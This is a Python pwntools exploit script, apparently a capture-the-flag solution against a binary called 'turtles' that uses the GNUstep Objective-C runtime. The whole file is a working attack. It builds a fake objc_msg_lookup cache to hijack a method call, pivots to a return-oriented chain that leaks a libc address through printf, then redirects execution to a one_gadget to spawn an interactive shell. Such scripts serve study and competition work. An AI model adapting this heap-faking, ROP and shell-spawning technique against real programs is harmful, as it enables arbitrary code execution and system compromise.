from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.log_level="debug"

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    # p = remote( , )
    pass
else:
    p = process("./turtles", env={"LD_PRELOAD": os.path.join(os.getcwd(), "./libs/libgnustep-base.so.1.25")})
    one_gadget = 0x4526a
    printf_offset = 0x55800
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """
              set disassembly-flavor intel
               b *0x400c72
               b *0x400c85
               b *0x400c9b
               b *0x400c32
               b *0x400c3e
               """)

pop_4_ret = 0x400d3c
pop_3_ret = 0x400d3e
pop_2_ret = 0x400d40
pop_1_ret = 0x400d42
pop_rdi = 0x400d43
pop_rsi_r15 = 0x400d41
printf_got = 0x601290

print p.recvline()
# restore heap data at addr 0x652610
payload = p64(0x0000000000652670) # evil turtle
# payload = p64(0x00000000006014c0) # real turtle
# stack rop chain?
payload += p64(pop_rdi)
payload += p64(0x652668) # ptr to %x string
payload += p64(pop_rsi_r15)
# payload += p64(0x0000000000631770)

payload += p64(printf_got+1)
payload += p64(0x20) # garbage r15

payload += p64(0x400c39) # call printf

payload += "deadbeef"
payload += "deadbeef"
payload += "deadbeef"
payload += "deadbeef"
# payload += p64(0x400C43) # return to read again 
# payload += p64(0x400C5C) # return to memcpy
# payload += p64(0x40c77)
# payload += p64(0x400c8a)
payload += "%s\n" + "\x00"*5 # addr 0x652668

#addr 0x652670
# fake control over RDI and RSI for objc_msg_lookup 
payload += p64(0x652670) # 1. val set to RBX, later mov [rbx+0x40] to rdx
payload += p64(0x652690 - 0x64*8) # 3. addr 0x652678 moved into r8 at    0x7ffff73facc0 <objc_msg_lookup+80>     mov    r8, qword ptr [rdx]
payload += p64(0x6526b8) # rdx+8, if r8 < 0xff,  0x7ffff73faca4 <objc_msg_lookup+52>    mov    rax, qword ptr [rdx + 8]

payload += p64(0x400b56) # 5. addr 0x652688. mov    rax, qword ptr [rax + rcx*8]. rcx = 0x15. RAX CALL TARGET 2!

payload += p64(0x652688 - 0x15*8) # 4. addr 0x652690.   0x7ffff73facc5 <objc_msg_lookup+85>     mov    rax, qword ptr [r8 + rax*8]. rax = 0x64 here

payload += p64(0xff)*3
payload += p64(0x652678) # 2. addr 0x6526b0 fake cache list at [rbx+0x40], stored into rdx

payload += p64(pop_4_ret) # RAX CALL TARGET 1. Setup pivot to stack rop chain

print "payload len", len(payload)

# payload += 

# create a fake 
p.sendline(payload)

libc_leak = p.recvline().strip()
print "libc_leak", repr(libc_leak)
libc_leak = u64(("\x00" + libc_leak).ljust(8, "\x00"))

libc_base = libc_leak - printf_offset
print "libc base", hex(libc_base)

# send payload, read again

payload = p64(0x0000000000652670) # evil turtle
# payload = p64(0x00000000006014c0) # real turtle
# stack rop chain?
payload += p64(pop_rdi)
payload += p64(0x652668) # ptr to %x string
payload += p64(pop_rsi_r15)
# payload += p64(0x0000000000631770)

payload += p64(printf_got+1)
payload += p64(0x20) # garbage r15

payload += p64(0x400c39) # call printf

payload += p64(0x400C43) # return to read again 
payload += p64(0x400C5C) # return to memcpy
payload += p64(0x40c77)
payload += p64(0x400c8a)
payload += "%s\n" + "\x00"*5 # addr 0x652668

#addr 0x652670
# fake control over RDI and RSI for objc_msg_lookup 
payload += p64(0x652670) # 1. val set to RBX, later mov [rbx+0x40] to rdx
payload += p64(0x652690 - 0x64*8) # 3. addr 0x652678 moved into r8 at    0x7ffff73facc0 <objc_msg_lookup+80>     mov    r8, qword ptr [rdx]
payload += p64(0x6526b8) # rdx+8, if r8 < 0xff,  0x7ffff73faca4 <objc_msg_lookup+52>    mov    rax, qword ptr [rdx + 8]

payload += p64(0x400b56) # 5. addr 0x652688. mov    rax, qword ptr [rax + rcx*8]. rcx = 0x15. RAX CALL TARGET 2!

payload += p64(0x652688 - 0x15*8) # 4. addr 0x652690.   0x7ffff73facc5 <objc_msg_lookup+85>     mov    rax, qword ptr [r8 + rax*8]. rax = 0x64 here

payload += p64(0xff)*3
payload += p64(0x652678) # 2. addr 0x6526b0 fake cache list at [rbx+0x40], stored into rdx

payload += p64(libc_base+one_gadget) # RAX CALL TARGET 1. Setup pivot to stack rop chain

print "payload len", len(payload)
p.sendline(payload)
p.sendline(payload)
p.interactive()
